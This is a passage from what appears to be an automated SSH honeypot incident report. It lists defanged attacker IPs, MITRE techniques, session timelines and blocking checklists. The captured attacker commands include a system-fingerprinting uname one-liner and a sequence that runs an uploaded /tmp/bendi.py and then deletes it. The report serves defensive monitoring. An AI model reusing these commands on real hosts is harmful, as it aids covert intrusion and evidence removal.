| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:43:31` | `cowrie.session.connect` |
| `2026-07-24 05:43:31` | `cowrie.client.version` |
| `2026-07-24 05:43:31` | `cowrie.client.kex` |
| `2026-07-24 05:43:32` | `cowrie.login.success` |
| `2026-07-24 05:43:33` | `cowrie.session.file_upload` |
| `2026-07-24 05:43:35` | `cowrie.session.params` |
| `2026-07-24 05:43:35` | `cowrie.command.input` |
| `2026-07-24 05:43:35` | `cowrie.command.input` |
| `2026-07-24 05:43:35` | `cowrie.command.input` |
| `2026-07-24 05:43:35` | `cowrie.command.failed` |
| `2026-07-24 05:43:35` | `cowrie.log.closed` |
| `2026-07-24 05:43:36` | `cowrie.session.params` |
| `2026-07-24 05:43:36` | `cowrie.command.input` |
| `2026-07-24 05:43:36` | `cowrie.log.closed` |
| `2026-07-24 05:43:37` | `cowrie.session.params` |
| `2026-07-24 05:43:37` | `cowrie.command.input` |
| `2026-07-24 05:43:37` | `cowrie.log.closed` |
| `2026-07-24 05:43:38` | `cowrie.session.params` |
| `2026-07-24 05:43:38` | `cowrie.command.input` |
| `2026-07-24 05:43:38` | `cowrie.command.failed` |
| `2026-07-24 05:43:38` | `cowrie.command.failed` |
| `2026-07-24 05:44:40` | `cowrie.session.params` |
| `2026-07-24 05:44:40` | `cowrie.command.input` |
| `2026-07-24 05:45:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-916dffa2072d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:44 |
| **Last Seen** | 2026-07-24 05:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:44:32` | `cowrie.session.connect` |
| `2026-07-24 05:44:32` | `cowrie.client.version` |
| `2026-07-24 05:44:32` | `cowrie.client.kex` |
| `2026-07-24 05:44:32` | `cowrie.login.success` |
| `2026-07-24 05:44:33` | `cowrie.session.params` |
| `2026-07-24 05:44:33` | `cowrie.command.input` |
| `2026-07-24 05:44:33` | `cowrie.log.closed` |
| `2026-07-24 05:44:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a8ad87bfe22

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:44 |
| **Last Seen** | 2026-07-24 05:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:44:53` | `cowrie.session.connect` |
| `2026-07-24 05:44:53` | `cowrie.client.version` |
| `2026-07-24 05:44:53` | `cowrie.client.kex` |
| `2026-07-24 05:44:56` | `cowrie.login.success` |
| `2026-07-24 05:44:58` | `cowrie.session.params` |
| `2026-07-24 05:44:58` | `cowrie.command.input` |
| `2026-07-24 05:44:58` | `cowrie.command.input` |
| `2026-07-24 05:44:58` | `cowrie.command.input` |
| `2026-07-24 05:44:58` | `cowrie.command.input` |
| `2026-07-24 05:44:58` | `cowrie.command.input` |
| `2026-07-24 05:44:58` | `cowrie.command.success` |
| `2026-07-24 05:44:58` | `cowrie.command.input` |
| `2026-07-24 05:44:58` | `cowrie.command.input` |
| `2026-07-24 05:44:58` | `cowrie.command.input` |
| `2026-07-24 05:44:58` | `cowrie.command.input` |
| `2026-07-24 05:44:59` | `cowrie.log.closed` |
| `2026-07-24 05:44:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b03b6fce5e5

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-24 05:45 |
| **Last Seen** | 2026-07-24 05:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:45:03` | `cowrie.session.connect` |
| `2026-07-24 05:45:03` | `cowrie.client.version` |
| `2026-07-24 05:45:03` | `cowrie.client.kex` |
| `2026-07-24 05:45:03` | `cowrie.login.success` |
| `2026-07-24 05:45:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90e4bb09f40b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-24 05:45 |
| **Last Seen** | 2026-07-24 05:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:45:04` | `cowrie.session.connect` |
| `2026-07-24 05:45:04` | `cowrie.client.version` |
| `2026-07-24 05:45:04` | `cowrie.client.kex` |
| `2026-07-24 05:45:04` | `cowrie.login.success` |
| `2026-07-24 05:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a797d810fca0

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-24 05:45 |
| **Last Seen** | 2026-07-24 05:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:45:09` | `cowrie.session.connect` |
| `2026-07-24 05:45:09` | `cowrie.client.version` |
| `2026-07-24 05:45:09` | `cowrie.client.kex` |
| `2026-07-24 05:45:09` | `cowrie.login.success` |
| `2026-07-24 05:45:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-466d070b2a9e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-24 05:45 |
| **Last Seen** | 2026-07-24 05:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:45:09` | `cowrie.session.connect` |
| `2026-07-24 05:45:09` | `cowrie.client.version` |
| `2026-07-24 05:45:09` | `cowrie.client.kex` |
| `2026-07-24 05:45:09` | `cowrie.login.success` |
| `2026-07-24 05:45:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9e828972d92

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-24 05:45 |
| **Last Seen** | 2026-07-24 05:47 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:45:40` | `cowrie.session.connect` |
| `2026-07-24 05:45:40` | `cowrie.client.version` |
| `2026-07-24 05:45:40` | `cowrie.client.kex` |
| `2026-07-24 05:45:41` | `cowrie.login.success` |
| `2026-07-24 05:45:43` | `cowrie.session.file_upload` |
| `2026-07-24 05:45:44` | `cowrie.session.params` |
| `2026-07-24 05:45:44` | `cowrie.command.input` |
| `2026-07-24 05:45:44` | `cowrie.command.input` |
| `2026-07-24 05:45:44` | `cowrie.command.input` |
| `2026-07-24 05:45:44` | `cowrie.command.failed` |
| `2026-07-24 05:45:44` | `cowrie.log.closed` |
| `2026-07-24 05:45:45` | `cowrie.session.params` |
| `2026-07-24 05:45:45` | `cowrie.command.input` |
| `2026-07-24 05:45:45` | `cowrie.log.closed` |
| `2026-07-24 05:45:47` | `cowrie.session.params` |
| `2026-07-24 05:45:47` | `cowrie.command.input` |
| `2026-07-24 05:45:47` | `cowrie.log.closed` |
| `2026-07-24 05:45:48` | `cowrie.session.params` |
| `2026-07-24 05:45:48` | `cowrie.command.input` |
| `2026-07-24 05:45:48` | `cowrie.command.failed` |
| `2026-07-24 05:45:48` | `cowrie.command.failed` |
| `2026-07-24 05:46:49` | `cowrie.session.params` |
| `2026-07-24 05:46:49` | `cowrie.command.input` |
| `2026-07-24 05:47:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5261786df886

| Field | Detail |
|---|---|
| **Source IP** | `118.163.145[.]175` |
| **First Seen** | 2026-07-24 05:45 |
| **Last Seen** | 2026-07-24 05:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:45:48` | `cowrie.session.connect` |
| `2026-07-24 05:45:49` | `cowrie.client.version` |
| `2026-07-24 05:45:49` | `cowrie.client.kex` |
| `2026-07-24 05:45:51` | `cowrie.login.success` |
| `2026-07-24 05:45:52` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.145[.]175` to AbuseIPDB if not already reported
- [ ] Block `118.163.145[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-954316837bd6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:46 |
| **Last Seen** | 2026-07-24 05:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:46:18` | `cowrie.session.connect` |
| `2026-07-24 05:46:18` | `cowrie.client.version` |
| `2026-07-24 05:46:18` | `cowrie.client.kex` |
| `2026-07-24 05:46:18` | `cowrie.login.success` |
| `2026-07-24 05:46:19` | `cowrie.session.params` |
| `2026-07-24 05:46:19` | `cowrie.command.input` |
| `2026-07-24 05:46:19` | `cowrie.log.closed` |
| `2026-07-24 05:46:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df90a3de1932

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:47 |
| **Last Seen** | 2026-07-24 05:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:47:16` | `cowrie.session.connect` |
| `2026-07-24 05:47:16` | `cowrie.client.version` |
| `2026-07-24 05:47:16` | `cowrie.client.kex` |
| `2026-07-24 05:47:18` | `cowrie.login.success` |
| `2026-07-24 05:47:20` | `cowrie.session.params` |
| `2026-07-24 05:47:20` | `cowrie.command.input` |
| `2026-07-24 05:47:20` | `cowrie.command.input` |
| `2026-07-24 05:47:20` | `cowrie.command.input` |
| `2026-07-24 05:47:20` | `cowrie.command.input` |
| `2026-07-24 05:47:20` | `cowrie.command.input` |
| `2026-07-24 05:47:20` | `cowrie.command.success` |
| `2026-07-24 05:47:20` | `cowrie.command.input` |
| `2026-07-24 05:47:20` | `cowrie.command.input` |
| `2026-07-24 05:47:20` | `cowrie.command.input` |
| `2026-07-24 05:47:20` | `cowrie.command.input` |
| `2026-07-24 05:47:20` | `cowrie.log.closed` |
| `2026-07-24 05:47:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd3c01ffc94e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:48 |
| **Last Seen** | 2026-07-24 05:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:48:03` | `cowrie.session.connect` |
| `2026-07-24 05:48:03` | `cowrie.client.version` |
| `2026-07-24 05:48:03` | `cowrie.client.kex` |
| `2026-07-24 05:48:03` | `cowrie.login.success` |
| `2026-07-24 05:48:04` | `cowrie.session.params` |
| `2026-07-24 05:48:04` | `cowrie.command.input` |
| `2026-07-24 05:48:04` | `cowrie.log.closed` |
| `2026-07-24 05:48:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43ddaf8ffe2d

| Field | Detail |
|---|---|
| **Source IP** | `219.144.16[.]16` |
| **First Seen** | 2026-07-24 05:49 |
| **Last Seen** | 2026-07-24 05:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:49:11` | `cowrie.session.connect` |
| `2026-07-24 05:49:11` | `cowrie.client.version` |
| `2026-07-24 05:49:11` | `cowrie.client.kex` |
| `2026-07-24 05:49:14` | `cowrie.login.success` |
| `2026-07-24 05:49:14` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.144.16[.]16` to AbuseIPDB if not already reported
- [ ] Block `219.144.16[.]16` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-269d14e7aa39

| Field | Detail |
|---|---|
| **Source IP** | `81.195.152[.]14` |
| **First Seen** | 2026-07-24 05:49 |
| **Last Seen** | 2026-07-24 05:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:49:20` | `cowrie.session.connect` |
| `2026-07-24 05:49:20` | `cowrie.client.version` |
| `2026-07-24 05:49:20` | `cowrie.client.kex` |
| `2026-07-24 05:49:21` | `cowrie.login.success` |
| `2026-07-24 05:49:22` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:49:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.195.152[.]14` to AbuseIPDB if not already reported
- [ ] Block `81.195.152[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bb41136cc57

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:49 |
| **Last Seen** | 2026-07-24 05:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:49:39` | `cowrie.session.connect` |
| `2026-07-24 05:49:39` | `cowrie.client.version` |
| `2026-07-24 05:49:39` | `cowrie.client.kex` |
| `2026-07-24 05:49:41` | `cowrie.login.success` |
| `2026-07-24 05:49:43` | `cowrie.session.params` |
| `2026-07-24 05:49:43` | `cowrie.command.input` |
| `2026-07-24 05:49:43` | `cowrie.command.input` |
| `2026-07-24 05:49:43` | `cowrie.command.input` |
| `2026-07-24 05:49:43` | `cowrie.command.input` |
| `2026-07-24 05:49:43` | `cowrie.command.input` |
| `2026-07-24 05:49:43` | `cowrie.command.success` |
| `2026-07-24 05:49:43` | `cowrie.command.input` |
| `2026-07-24 05:49:43` | `cowrie.command.input` |
| `2026-07-24 05:49:43` | `cowrie.command.input` |
| `2026-07-24 05:49:43` | `cowrie.command.input` |
| `2026-07-24 05:49:43` | `cowrie.log.closed` |
| `2026-07-24 05:49:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3154dadba0be

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-24 05:49 |
| **Last Seen** | 2026-07-24 05:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:49:49` | `cowrie.session.connect` |
| `2026-07-24 05:49:49` | `cowrie.client.version` |
| `2026-07-24 05:49:49` | `cowrie.client.kex` |
| `2026-07-24 05:49:49` | `cowrie.login.success` |
| `2026-07-24 05:49:49` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:49:49` | `cowrie.direct-tcpip.ja4` |
| `2026-07-24 05:49:49` | `cowrie.direct-tcpip.data` |
| `2026-07-24 05:49:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df1066e0e0db

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:49 |
| **Last Seen** | 2026-07-24 05:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:49:50` | `cowrie.session.connect` |
| `2026-07-24 05:49:50` | `cowrie.client.version` |
| `2026-07-24 05:49:50` | `cowrie.client.kex` |
| `2026-07-24 05:49:50` | `cowrie.login.success` |
| `2026-07-24 05:49:51` | `cowrie.session.params` |
| `2026-07-24 05:49:51` | `cowrie.command.input` |
| `2026-07-24 05:49:51` | `cowrie.log.closed` |
| `2026-07-24 05:49:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce3239e1408b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:51 |
| **Last Seen** | 2026-07-24 05:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:51:36` | `cowrie.session.connect` |
| `2026-07-24 05:51:36` | `cowrie.client.version` |
| `2026-07-24 05:51:36` | `cowrie.client.kex` |
| `2026-07-24 05:51:36` | `cowrie.login.success` |
| `2026-07-24 05:51:37` | `cowrie.session.params` |
| `2026-07-24 05:51:37` | `cowrie.command.input` |
| `2026-07-24 05:51:37` | `cowrie.log.closed` |
| `2026-07-24 05:51:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03b43124c8dc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-24 05:51 |
| **Last Seen** | 2026-07-24 05:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:51:59` | `cowrie.session.connect` |
| `2026-07-24 05:51:59` | `cowrie.client.version` |
| `2026-07-24 05:51:59` | `cowrie.client.kex` |
| `2026-07-24 05:51:59` | `cowrie.login.success` |
| `2026-07-24 05:52:00` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:52:00` | `cowrie.direct-tcpip.ja4` |
| `2026-07-24 05:52:00` | `cowrie.direct-tcpip.data` |
| `2026-07-24 05:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6325543570d2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:52 |
| **Last Seen** | 2026-07-24 05:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:52:14` | `cowrie.session.connect` |
| `2026-07-24 05:52:14` | `cowrie.client.version` |
| `2026-07-24 05:52:14` | `cowrie.client.kex` |
| `2026-07-24 05:52:16` | `cowrie.login.success` |
| `2026-07-24 05:52:18` | `cowrie.session.params` |
| `2026-07-24 05:52:18` | `cowrie.command.input` |
| `2026-07-24 05:52:18` | `cowrie.command.input` |
| `2026-07-24 05:52:18` | `cowrie.command.input` |
| `2026-07-24 05:52:18` | `cowrie.command.input` |
| `2026-07-24 05:52:18` | `cowrie.command.input` |
| `2026-07-24 05:52:18` | `cowrie.command.success` |
| `2026-07-24 05:52:18` | `cowrie.command.input` |
| `2026-07-24 05:52:18` | `cowrie.command.input` |
| `2026-07-24 05:52:18` | `cowrie.command.input` |
| `2026-07-24 05:52:18` | `cowrie.command.input` |
| `2026-07-24 05:52:18` | `cowrie.log.closed` |
| `2026-07-24 05:52:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77e88d26368e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:53 |
| **Last Seen** | 2026-07-24 05:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
